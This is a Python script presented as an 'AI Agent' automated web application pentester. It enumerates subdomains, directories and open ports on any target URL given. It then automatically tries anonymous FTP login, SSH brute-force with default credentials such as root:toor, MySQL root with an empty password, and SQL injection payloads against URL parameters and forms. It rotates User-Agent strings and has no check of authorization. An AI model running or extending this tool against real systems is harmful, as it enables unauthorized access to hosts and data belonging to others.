import requests
from bs4 import BeautifulSoup
import socket
from urllib.parse import urljoin, urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
import random
import argparse
from pyfiglet import Figlet  # For generating ASCII art text
import sys  # For redirecting output to a file
import paramiko  # For SSH brute-force
import ftplib  # For FTP anonymous login
import pymysql  # For MySQL default credentials
import re  # For parsing HTML forms

# Common ports for port scanning
COMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 3389, 8080, 445]

# List of User-Agents to randomize requests
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
]

def get_random_user_agent():
    """Return a random User-Agent string."""
    return random.choice(USER_AGENTS)

def display_intro():
    """Display the AI Agent introduction message with larger text."""
    figlet = Figlet(font='slant')  # You can change the font (e.g., 'slant', 'block', 'banner')
    ai_agent_text = figlet.renderText("   AI - Agent")
    print("\n" + "=" * 73)
    print(ai_agent_text)
    figlet_small = Figlet(font='small')  # You can change this to another font
    pentester_text = figlet_small.renderText("Web App Pentester")
    print(pentester_text)
    print("=" * 73)
    print(" Hello! I am your AI-Agent Pentesting Assistant.")
    print(" I will do automatic Web Application Pentesting.")
    print(" Let's get started!\n")

class Exploiter:
    def __init__(self, domain, port):
        self.domain = domain
        self.port = port

    def exploit_ftp(self):
        """Attempt anonymous FTP login."""
        try:
            ftp = ftplib.FTP(self.domain)
            ftp.login()  # Attempt anonymous login
            ftp.quit()
            return "[+] FTP Anonymous login successful!"
        except Exception as e:
            return f"[-] FTP Anonymous login failed: {e}"

    def exploit_ssh(self):
        """Attempt SSH brute-force with common credentials."""
        common_credentials = [
            ("root", "toor"),
            ("admin", "admin"),
            ("user", "user"),
        ]
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        for username, password in common_credentials:
            try:
                ssh.connect(self.domain, port=self.port, username=username, password=password, timeout=5)
                ssh.close()
                return f"[+] SSH Brute-force successful: {username}:{password}"
            except Exception as e:
                continue
        return "[-] SSH Brute-force failed."

    def exploit_http(self):
        """Check for common HTTP vulnerabilities."""
        try:
            url = f"http://{self.domain}:{self.port}"
            response = requests.get(url, headers={"User-Agent": get_random_user_agent()}, timeout=5)
            if response.status_code == 200:
                return f"[+] HTTP Service is running: {url}"
        except Exception as e:
            return f"[-] HTTP Exploit failed: {e}"

    def exploit_smb(self):
        """Check for SMB vulnerabilities (e.g., EternalBlue)."""
        return "[!] SMB Exploitation not implemented (requires Metasploit or custom scripts)."

    def exploit_mysql(self):
        """Attempt MySQL default credentials."""
        try:
            connection = pymysql.connect(host=self.domain, port=self.port, user="root", password="")
            connection.close()
            return "[+] MySQL Default credentials successful!"
        except Exception as e:
            return f"[-] MySQL Exploit failed: {e}"

    def exploit(self):
        """Exploit the open port based on the service."""
        if self.port == 21:
            return self.exploit_ftp()
        elif self.port == 22:
            return self.exploit_ssh()
        elif self.port == 80 or self.port == 443:
            return self.exploit_http()
        elif self.port == 445:
            return self.exploit_smb()
        elif self.port == 3306:
            return self.exploit_mysql()
        else:
            return f"[!] No exploit available for port {self.port}."

class SQLiScanner:
    def __init__(self, target_url, sqli_payloads_file="sqli.txt"):
        self.target_url = target_url
        self.sqli_payloads_file = sqli_payloads_file
        self.vulnerable_params = []

    def extract_forms(self, url):
        """Extract all forms from the HTML content of a page."""
        try:
            response = requests.get(url, headers={"User-Agent": get_random_user_agent()}, timeout=5)
            soup = BeautifulSoup(response.content, "html.parser")
            return soup.find_all("form")
        except Exception as e:
            print(f"[-] Error extracting forms: {e}")
            return []

    def load_sqli_payloads(self):
        """Load SQLi payloads from the specified file."""
        try:
            with open(self.sqli_payloads_file, "r") as file:
                return [line.strip() for line in file if line.strip()]
        except FileNotFoundError:
            print(f"[-] SQLi payloads file '{self.sqli_payloads_file}' not found.")
            return []

    def test_sqli(self, url, params, method="GET"):
        """Test for SQL Injection vulnerabilities in a given URL and parameters."""
        payloads = self.load_sqli_payloads()
        if not payloads:
            return False

        try:
            for payload in payloads:
                modified_params = {k: payload for k in params.keys()}
                if method == "GET":
                    response = requests.get(url, params=modified_params, headers={"User-Agent": get_random_user_agent()}, timeout=5)
                elif method == "POST":
                    response = requests.post(url, data=modified_params, headers={"User-Agent": get_random_user_agent()}, timeout=5)
                if "error" in response.text.lower() or "syntax" in response.text.lower():
                    return True
        except Exception as e:
            print(f"[-] Error testing SQLi: {e}")
        return False

    def scan(self):
        """Scan the target URL for SQL Injection vulnerabilities."""
        print(f"\n[*] Scanning for SQL Injection vulnerabilities on {self.target_url}...")

        # Test URL parameters
        parsed_url = urlparse(self.target_url)
        query_params = parse_qs(parsed_url.query)
        if query_params:
            print("[*] Testing URL parameters...")
            for param in query_params:
                if self.test_sqli(self.target_url, {param: "test"}):
                    print(f"[+] SQL Injection vulnerability found in URL parameter: {param}")
                    self.vulnerable_params.append((param, "URL parameter"))

        # Test forms
        forms = self.extract_forms(self.target_url)
        if forms:
            print("[*] Testing forms...")
            for form in forms:
                action = form.get("action")
                method = form.get("method", "GET").upper()
                inputs = form.find_all("input")
                form_params = {input_tag.get("name"): "test" for input_tag in inputs if input_tag.get("name")}
                if action:
                    form_url = urljoin(self.target_url, action)
                    if self.test_sqli(form_url, form_params, method):
                        print(f"[+] SQL Injection vulnerability found in form: {form_url}")
                        self.vulnerable_params.append((form_url, "Form"))

        if not self.vulnerable_params:
            print("[-] No SQL Injection vulnerabilities found.")

class SubdomainScanner:
    def __init__(self, domain, wordlist="subdomains.txt"):
        self.domain = domain
        self.wordlist = wordlist

    def check_subdomain(self, subdomain):
        """Check if a subdomain is live."""
        url = f"http://{subdomain}"
        headers = {"User-Agent": get_random_user_agent()}
        try:
            response = requests.get(url, headers=headers, timeout=5)
            if response.status_code == 200:
                return url
        except requests.RequestException:
            pass
        return None

    def scan(self):
        """Enumerate subdomains using a wordlist."""
        subdomains = []
        try:
            with open(self.wordlist, "r") as file:
                words = file.read().splitlines()
            print(f"[*] Enumerating subdomains using {self.wordlist}...")
            with ThreadPoolExecutor(max_workers=20) as executor:
                futures = [executor.submit(self.check_subdomain, f"{word}.{self.domain}") for word in words]
                for future in tqdm(as_completed(futures), total=len(words), desc="Subdomains", unit="subdomain"):
                    result = future.result()
                    if result:
                        subdomains.append(result)
        except FileNotFoundError:
            print(f"[-] Subdomain wordlist '{self.wordlist}' not found.")
        return subdomains

class DirectoryScanner:
    def __init__(self, base_url, wordlist="common.txt"):
        self.base_url = base_url
        self.wordlist = wordlist

    def check_directory(self, path):
        """Check if a directory or file exists."""
        url = f"{self.base_url}/{path}"
        headers = {"User-Agent": get_random_user_agent()}
        try:
            response = requests.get(url, headers=headers, timeout=5)
            if response.status_code == 200:
                return url
        except requests.RequestException:
            pass
        return None

    def scan(self):
        """Enumerate directories and files using a wordlist."""
        discovered_paths = []
        try:
            with open(self.wordlist, "r") as file:
                words = file.read().splitlines()
            print(f"[*] Enumerating directories and files using {self.wordlist}...")
            with ThreadPoolExecutor(max_workers=20) as executor:
                futures = [executor.submit(self.check_directory, word) for word in words]
                for future in tqdm(as_completed(futures), total=len(words), desc="Directories/Files", unit="path"):
                    result = future.result()
                    if result:
                        discovered_paths.append(result)
        except FileNotFoundError:
            print(f"[-] Directory wordlist '{self.wordlist}' not found.")
        return discovered_paths

class PortScanner:
    def __init__(self, domain, ports=COMMON_PORTS):
        self.domain = domain
        self.ports = ports

    def scan(self):
        """Scan common ports on the target domain."""
        open_ports = []
        print(f"\n[*] Scanning common ports on {self.domain}...")
        for port in tqdm(self.ports, desc="Ports", unit="port"):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((self.domain, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        return open_ports

def main(target_url=None, output_file=None):
    # Display intro message in the terminal before redirecting output
    display_intro()

    # Redirect output to a file if specified
    if output_file:
        sys.stdout = open(output_file, "w")

    # If target_url is not provided as an argument, prompt the user
    if not target_url:
        target_url = input("Target Web App URL (e.g., https://example.com): ").strip()
    
    # Ensure the URL starts with http:// or https://
    if not target_url.startswith(("http://", "https://")):
        target_url = f"http://{target_url}"

    # Extract domain from the target URL
    domain = target_url.split("//")[-1].split("/")[0]

    # Initialize scanners
    subdomain_scanner = SubdomainScanner(domain)
    directory_scanner = DirectoryScanner(target_url)
    port_scanner = PortScanner(domain)
    sqli_scanner = SQLiScanner(target_url)

    # Run scans
    print(f"\n[+] Scanning target: {target_url} ...")

    # Subdomain scanning
    subdomains = subdomain_scanner.scan()
    if subdomains:
        print("\n[+] Discovered Subdomains:")
        for subdomain in subdomains:
            print(subdomain)
    else:
        print("\n[-] No subdomains found.")

    # Directory and file enumeration
    discovered_paths = directory_scanner.scan()
    if discovered_paths:
        print("\n[+] Discovered Directories/Files:")
        for path in discovered_paths:
            print(path)
    else:
        print("\n[-] No directories or files found.")

    # Port scanning (performed last)
    open_ports = port_scanner.scan()
    if open_ports:
        print("\n[+] Open Ports:")
        for port in open_ports:
            print(f"Port {port} is open")
            # Attempt exploitation
            exploiter = Exploiter(domain, port)
            result = exploiter.exploit()
            print(result)
    else:
        print("\n[-] No open ports found.")

    # SQL Injection scanning
    sqli_scanner.scan()

    # Close the output file if redirected
    if output_file:
        sys.stdout.close()
        print(f"[*] Report saved to {output_file}")

if __name__ == "__main__":
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="AI Agent: Web Application Pentester")
    parser.add_argument("target_url", nargs="?", help="Target web application URL (e.g., https://example.com)")
    parser.add_argument("-o", "--output", help="Save the output to a file")
    args = parser.parse_args()

    # Run the pentesting tool
    main(args.target_url, args.output)